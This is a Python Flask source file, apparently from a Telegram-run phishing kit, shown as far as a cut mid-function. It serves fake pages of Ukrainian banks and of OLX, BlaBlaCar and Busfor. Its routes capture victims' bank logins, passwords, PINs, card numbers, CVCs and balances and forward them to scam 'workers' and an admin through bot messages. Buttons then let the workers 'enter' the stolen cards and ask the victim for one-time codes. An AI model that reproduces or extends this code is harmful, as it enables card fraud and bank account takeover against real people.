from tracemalloc import DomainFilter
from flask import Flask, render_template, request, redirect, url_for,flash
from main import bot,types
from config import *
import sqlite3
import time



app = Flask(__name__)






#flask
@app.route('/open/<int:randItem>', methods=['POST', 'GET'])
def openFake(randItem,verbose = False):
    if randItem == randItem:
            ip_addr = request.remote_addr
            dbs = sqlite3.connect('users.db')
            sql = dbs.cursor()
            dbs.commit()
            sql.execute(f"SELECT FackePrace FROM FackeData WHERE idFake = {randItem}")
            fSum = sql.fetchone()
            sql.execute(f"SELECT id FROM FackeData WHERE idFake = {randItem}")
            idWorkera = sql.fetchone()
            if request.method == "GET":
                if randItem == randItem:
                    sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                    dats = sql.fetchone()
                    if dats[8] == "privat24": 
                        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                        bbkua = sql.fetchone()
                        cash = bbkua[5]
                        city_start = bbkua[3]
                        city_end = bbkua[4]
                        bot.send_message(idWorkera[0], f"<b>🦣Мамонт открыл ссылку\n🧊IP MAMONTS: {ip_addr}\n🧊Сервис: {bbkua[8]}\n💸Cумма: {cash} грн</b>")
                        return render_template("privat24/privat24.html", cash = fSum[0],keySTR = randItem,domain = dprivat24)
                    if dats[8] == "pumb": 
                        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                        bbkua = sql.fetchone()
                        cash = bbkua[5]
                        city_start = bbkua[3]
                        city_end = bbkua[4]
                        bot.send_message(idWorkera[0], f"<b>🦣Мамонт открыл ссылку\n🧊IP MAMONTS: {ip_addr}\n🧊Сервис: {bbkua[8]}\n💸Cумма: {cash} грн</b>")
                        return render_template("pumb/pumb.html", cash = fSum[0],keySTR = randItem,domain = dpumb)
                    if dats[8] == "oschad": 
                        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                        bbkua = sql.fetchone()
                        cash = bbkua[5]
                        city_start = bbkua[3]
                        city_end = bbkua[4]
                        bot.send_message(idWorkera[0], f"<b>🦣Мамонт открыл ссылку\n🧊IP MAMONTS: {ip_addr}\n🧊Сервис: {bbkua[8]}\n💸Cумма: {cash} грн</b>")
                        return render_template("oschad/oschad.html", cash = fSum[0],keySTR = randItem,domain = doschad)
                    

                    if dats[8] == "raif": 
                        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                        bbkua = sql.fetchone()
                        cash = bbkua[5]
                        city_start = bbkua[3]
                        city_end = bbkua[4]
                        bot.send_message(idWorkera[0], f"<b>🦣Мамонт открыл ссылку\n🧊IP MAMONTS: {ip_addr}\n🧊Сервис: {bbkua[8]}\n💸Cумма: {cash} грн</b>")
                        return render_template("raif/raif24.html", cash = fSum[0],keySTR = randItem,domain = draif)
                    
                    if dats[8] == "olx": 
                        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                        olxua = sql.fetchone()
                        sql.execute(f"SELECT FackeAdress FROM FackeData WHERE idFake = {randItem}")
                        d = sql.fetchone()
                        imgs = d[0]
                        cash = str( olxua[5])
                        title = str(olxua[6])
                        id = str(olxua[7])
                        print(cash)
                        bot.send_message(idWorkera[0], f"<b>🦣Мамонт открыл ссылку\n🧊IP MAMONTS: {ip_addr}\n🧊Сервис: {olxua[8]}\n💸Cумма: {cash} грн</b>")
                        return render_template("olx.html", imgs = str(imgs), id = id, cash = str(cash),keySTR = randItem, domain = dolx,  title = str(title))
                    if dats[8] == "blablacarUa": 
                        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                        bbkua = sql.fetchone()
                        cash = bbkua[5]
                        city_start = bbkua[3]
                        city_end = bbkua[4]
                        bot.send_message(idWorkera[0], f"<b>🦣Мамонт открыл ссылку\n🧊IP MAMONTS: {ip_addr}\n🧊Сервис: {bbkua[8]}\n💸Cумма: {cash} грн</b>")
                        return render_template("blablacarua.html", cash = cash,firstcity = city_start, secondcity=city_end,keySTR = randItem, domain = dbbkua)  
                    if dats[8] == "busfor": 
                        sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                        bus = sql.fetchone()
                        cash = bus[5]
                        city_start = bus[3]
                        city_end = bus[4]
                        T = time.localtime(time.time())
                        today = T.tm_mday
                        tomoth = T.tm_mon
                        toyear = T.tm_year
                        bot.send_message(idWorkera[0], f"<b>🦣Мамонт открыл ссылку\n🧊IP MAMONTS: {ip_addr}\n🧊Сервис: {bus[8]}\n💸Cумма: {cash} грн</b>")
                        return render_template("busfor/busfor.html", cash = cash,firstcity = city_start, secondcity=city_end,keySTR = randItem, domain = dbusfor,today=today,tomoth = tomoth,toyear = toyear)
                    if dats[8] is None:
                        return render_template('/page_error/404.html')
                            
                if randItem != randItem:
                    return render_template('/page_error/404.html')

    return render_template('/page_error/404.html')
    
        
        

@app.route('/input/<int:randItem>', methods=['POST', 'GET'])
def openInputFake(randItem):
    ip_addr = request.remote_addr
    dbs = sqlite3.connect('users.db')
    sql = dbs.cursor()
    dbs.commit()
    sql.execute("SELECT * FROM FackeData WHERE idFake = ?", (randItem,))
    ids = sql.fetchone()
    idW = ids[0]
    sql.execute(f"SELECT FackePrace FROM FackeData WHERE idFake = {randItem}")
    fSum = sql.fetchone()
    cash = fSum[0]
    sql.execute("SELECT idFake FROM FackeData WHERE idFake = ?", (randItem,))
    exists = sql.fetchone()
    if exists:
        if request.method == "POST":
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
            dats = sql.fetchone()
            if dats[8] == "privat24":
                name = request.form['name']
                password = request.form['password']
                pin = request.form['pin']
            if dats[8] == "pumb":
                number = request.form['phone']
                password = request.form['pass']
                pin = request.form['pin']
            if dats[8] == "oschad":
                number = request.form['phone']
                password = request.form['pass']
                pin = request.form['pin']
            if dats[8] == "raif":
                login = request.form['login']
                password = request.form['password']
            if dats[8] == "blablacarUa":  
                card = request.form['card']
                data_m = request.form['expdate_m']
                data_y = request.form['expdate_y']
                cvc = request.form['card_cvc']
                balance = request.form['balance']
                
            if dats[8] == "busfor":  
                card = request.form['card']
                data_m = request.form['expdate_m']
                data_y = request.form['expdate_y']
                cvc = request.form['card_cvc']
                balance = request.form['balance']
                
            if dats[8] == "olx":  
                card = request.form['card']
                data_m = request.form['expdate_m']
                data_y = request.form['fexpy']
                cvc = request.form['cvc']
                balance = request.form['balance']
                

            try:
                if dats[8] == "blablacarUa":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0])  
                    if int(vbiver[0]) == 0:
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"take_{card}_{data_m}_{data_y}_{cvc}_{balance}_{idW}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные карты\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        if int(balance) < 1000:
                                return render_template('privat24/loader.html',keySTR = randItem)
                        if int(balance) >= 1000:
                                return render_template('/accept3ds.html',keySTR = randItem, domain = dbbkua)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("❌Отказаться❌", callback_data=f"novbivcard_{card}_{data_m}_{data_y}_{cvc}_{balance}_{idW}_{item}")
                        markup.add(buts)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт ввел данные карты повторно\n\n🛍Сервис: {dats[8]}\n\n💳Кaрта <code>{card}</code>\n🗓Дата: {data_m}/{data_y}\n🔐CVC {cvc}\n🤑Баланс {balance} грн\n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные карты повторно\n</b><b>🧊Сервис: {ids[8]}</b>")
                        if int(balance) < 1000:
                                return render_template('privat24/loader.html',keySTR = randItem)
                        if int(balance) >= 1000:
                                return render_template('/accept3ds.html',keySTR = randItem, domain = dbbkua)
                    
                if dats[8] == "busfor":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0])  
                    if int(vbiver[0]) == 0:
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"take_{card}_{data_m}_{data_y}_{cvc}_{balance}_{idW}_{randItem}")
                        print(card)
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные карты\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        if int(balance) < 1000:
                                return render_template('privat24/loader.html',keySTR = randItem)
                        if int(balance) >= 1000:
                                return render_template('3ds/accept3ds.html',keySTR = randItem, domain = dbusfor)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        print(card)
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("❌Отказаться❌", callback_data=f"novbivcard_{card}_{data_m}_{data_y}_{cvc}_{balance}_{idW}_{item}")
                        markup.add(buts)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт ввел данные карты повторно\n\n🛍Сервис: {dats[8]}\n\n💳Кaрта <code>{card}</code>\n🗓Дата: {data_m}/{data_y}\n🔐CVC {cvc}\n🤑Баланс {balance} грн\n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные карты повторно\n</b><b>🧊Сервис:{ids[8]}</b>")
                        if int(balance) < 1000:
                                return render_template('privat24/loader.html',keySTR = randItem)
                        if int(balance) >= 1000:
                                return render_template('3ds/accept3ds.html',keySTR = randItem, domain = dbusfor)
                
                if dats[8] == "olx":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0])  
                    if int(vbiver[0]) == 0:
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"take_{card}_{data_m}_{data_y}_{cvc}_{balance}_{idW}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные карты\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        if int(balance) < 1000:
                                return render_template('privat24/loader.html',keySTR = randItem)
                        if int(balance) >= 1000:
                                return render_template('/accept3ds.html',keySTR = randItem, domain = dolx)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("❌Отказаться❌", callback_data=f"novbivcard_{card}_{data_m}_{data_y}_{cvc}_{balance}_{idW}_{item}")
                        markup.add(buts)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт ввел данные карты повторно\n\n🛍Сервис: {dats[8]}\n\n💳Кaрта <code>{card}</code>\n🗓Дата: {data_m}/{data_y}\n🔐CVC {cvc}\n🤑Баланс {balance} грн\n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные карты повторно\n</b><b>🧊Сервис:{ids[8]}</b>")
                        if int(balance) < 1000:
                                return render_template('privat24/loader.html',keySTR = randItem)
                        if int(balance) >= 1000:
                                return render_template('/accept3ds.html',keySTR = randItem, domain = dolx)

                if dats[8] == "privat24":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0]) 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    numbers = name.split(' ');number = numbers[0] + numbers[1] + numbers[2] + numbers[3]
                    print(number[0])
                    if int(vbiver[0]) == 0:
                        rew = sql.execute(f'SELECT number FROM logs WHERE number = {number}').fetchone()
                        if rew is None:
                            sql.execute(f'INSERT OR IGNORE INTO logs VALUES("{idW}",{randItem},"{number}","{password}","{pin}","{cash}");')
                            dbs.commit()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"takeLK_{number}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        print(number)
                        return render_template('privat24/loader.html',keySTR = randItem, domain = dprivat24)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{randItem}")
                        but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{randItem}")
                        but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{randItem}")
                        but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{randItem}")
                        but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"privarnovbiv_{number}_{randItem}")
                        markup.add(but,but1,but2,but3,but4)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт повторно ввел лк\n\n🛍Сервис: {dats[8]}\n\n📱Номер: <code>{number}</code>\n🔐Пароль: {password}\n🤑Пин: {pin} \n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        print(number)
                        return render_template('privat24/loader.html',keySTR = randItem, domain = dprivat24)
                
                
                

                #пумб
                if dats[8] == "pumb":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0]) 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    print(number[0])
                    if int(vbiver[0]) == 0:
                        rew = sql.execute(f'SELECT number FROM logs WHERE number = {number}').fetchone()
                        if rew is None:
                            sql.execute(f'INSERT OR IGNORE INTO logs VALUES("{idW}",{randItem},"{number}","{password}","{pin}","{cash}");')
                            dbs.commit()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"takeLK_{number}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        print(number)
                        return render_template('pumb/loader.html',keySTR = randItem, domain = dpumb)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{randItem}")
                        but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{randItem}")
                        but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{randItem}")
                        but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{randItem}")
                        but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"privarnovbiv_{number}_{randItem}")
                        markup.add(but,but1,but2,but3,but4)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт повторно ввел лк\n\n🛍Сервис: {dats[8]}\n\n📱Номер: <code>{number}</code>\n🔐Пароль: {password}\n🤑Пин: {pin} \n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        print(number)
                        return render_template('pumb/loader.html',keySTR = randItem, domain = dpumb)
                
                
                
                
                
                
                if dats[8] == "raif":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0]) 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    
                    if int(vbiver[0]) == 0:
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"takeLKRaif_{login}_{password}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        return render_template('raif/loader.html',keySTR = randItem, domain = draif)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{randItem}")
                        but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{randItem}")
                        but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{randItem}")
                        but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{randItem}")
                        but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"raifnovbiv_{login}_{randItem}")
                        markup.add(but,but1,but2,but3,but4)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт повторно ввел лк\n\n🛍Сервис: {dats[8]}\n\n📱Номер: <code>{login}</code>\n🔐Пароль: {password}\n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        return render_template('raif/loader.html',keySTR = randItem, domain = draif)


                #осчад
                if dats[8] == "oschad":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0]) 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    print(number[0])
                    if int(vbiver[0]) == 0:
                        rew = sql.execute(f'SELECT number FROM logs WHERE number = {number}').fetchone()
                        if rew is None:
                            sql.execute(f'INSERT OR IGNORE INTO logs VALUES("{idW}",{randItem},"{number}","{password}","{pin}","{cash}");')
                            dbs.commit()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"takeLK_{number}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        print(number)
                        return render_template('oschad/loader.html',keySTR = randItem, domain = doschad)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{randItem}")
                        but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{randItem}")
                        but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{randItem}")
                        but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{randItem}")
                        but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"privarnovbiv_{number}_{randItem}")
                        markup.add(but,but1,but2,but3,but4)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт повторно ввел лк\n\n🛍Сервис: {dats[8]}\n\n📱Номер: <code>{number}</code>\n🔐Пароль: {password}\n🤑Пин: {pin} \n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        print(number)
                        return render_template('oschad/loader.html',keySTR = randItem, domain = doschad)
               
            except:
                #пумб
                if dats[8] == "pumb":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0]) 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    print(number[0])
                    if int(vbiver[0]) == 0:
                        rew = sql.execute(f'SELECT number FROM logs WHERE number = {number}').fetchone()
                        if rew is None:
                            sql.execute(f'INSERT OR IGNORE INTO logs VALUES("{idW}",{randItem},"{number}","{password}","{pin}","{cash}");')
                            dbs.commit()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"takeLK_{number}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        print(number)
                        return render_template('pumb/loader.html',keySTR = randItem, domain = dpumb)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{randItem}")
                        but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{randItem}")
                        but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{randItem}")
                        but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{randItem}")
                        but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"privarnovbiv_{number}_{randItem}")
                        markup.add(but,but1,but2,but3,but4)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт повторно ввел лк\n\n🛍Сервис: {dats[8]}\n\n📱Номер: <code>{number}</code>\n🔐Пароль: {password}\n🤑Пин: {pin} \n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        print(number)
                        return render_template('pumb/loader.html',keySTR = randItem, domain = dpumb)



                #осчад
                if dats[8] == "oschad":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0]) 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    print(number[0])
                    if int(vbiver[0]) == 0:
                        rew = sql.execute(f'SELECT number FROM logs WHERE number = {number}').fetchone()
                        if rew is None:
                            sql.execute(f'INSERT OR IGNORE INTO logs VALUES("{idW}",{randItem},"{number}","{password}","{pin}","{cash}");')
                            dbs.commit()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"takeLK_{number}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        print(number)
                        return render_template('oschad/loader.html',keySTR = randItem, domain = doschad)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{randItem}")
                        but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{randItem}")
                        but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{randItem}")
                        but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{randItem}")
                        but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"privarnovbiv_{number}_{randItem}")
                        markup.add(but,but1,but2,but3,but4)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт повторно ввел лк\n\n🛍Сервис: {dats[8]}\n\n📱Номер: <code>{number}</code>\n🔐Пароль: {password}\n🤑Пин: {pin} \n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        print(number)
                        return render_template('oschad/loader.html',keySTR = randItem, domain = doschad)
                
                
                
                
                if dats[8] == "raif":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0]) 
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    
                    if int(vbiver[0]) == 0:
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"takeLKRaif_{login}_{password}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        return render_template('raif/loader.html',keySTR = randItem, domain = draif)
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{randItem}")
                        but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{randItem}")
                        but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{randItem}")
                        but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{randItem}")
                        but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"raifnovbiv_{login}_{randItem}")
                        markup.add(but,but1,but2,but3,but4)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт повторно ввел лк\n\n🛍Сервис: {dats[8]}\n\n📱Номер: <code>{login}</code>\n🔐Пароль: {password}\n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        return render_template('raif/loader.html',keySTR = randItem, domain = draif)

                if dats[8] == "privat24":
                    dbs = sqlite3.connect('users.db')
                    sql = dbs.cursor()
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    numbers = name.split(' ');number = numbers[0] + numbers[1] + numbers[2] + numbers[3]
                    if int(vbiver[0]) == 0:
                        rew = sql.execute(f'SELECT number FROM logs WHERE number = {number}').fetchone()
                        if rew is None:
                            sql.execute(f'INSERT OR IGNORE INTO logs VALUES("{idW}",{randItem},"{number}","{password}","{pin}","{cash}");')
                            dbs.commit()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"takeLK_{number}_{randItem}")
                        markup.add(buts)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        bot.send_message(chatAdmin, f"<b>🦣Мамонт ввёл данные🦣\n🌐IP:{ip_addr}</b>",reply_markup=markup)
                        print(number)
                        return render_template('privat24/loader.html',keySTR = randItem, domain = dprivat24)
                        
                    if int(vbiver[0]) != 0:
                        sql.execute(f"SELECT username FROM users WHERE id = {idW}")
                        us = sql.fetchone()
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{randItem}")
                        but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{randItem}")
                        but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{randItem}")
                        but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{randItem}")
                        but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"privarnovbiv_{number}_{randItem}")
                        markup.add(but,but1,but2,but3,but4)
                        bot.send_message(vbiver[0], f'<b>🚀Мамонт повторно ввел лк\n\n🛍Сервис: {dats[8]}\n\n📱Номер: <code>{number}</code>\n🔐Пароль: {password}\n🤑Пин: {pin} \n\n👤Воркер: @{us[0]} {idW}</b>',reply_markup=markup)
                        bot.send_message(idW,f"<b>💳Мамонт ввел данные лк\n</b><b>🧊Сервис:{ids[8]}</b>")
                        print(number)
                        return render_template('privat24/loader.html',keySTR = randItem, domain = dprivat24)   
                if dats[8] == "busfor":
                    sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {randItem}")
                    vbiver = sql.fetchone()
                    print(vbiver[0])  
                    if int(vbiver[0]) == 0:
                        markup = types.InlineKeyboardMarkup(row_width=2)
                        buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"take_{card}_{data_m}_{data_y}_{cvc}_{balance}_{idW}_{randItem}")
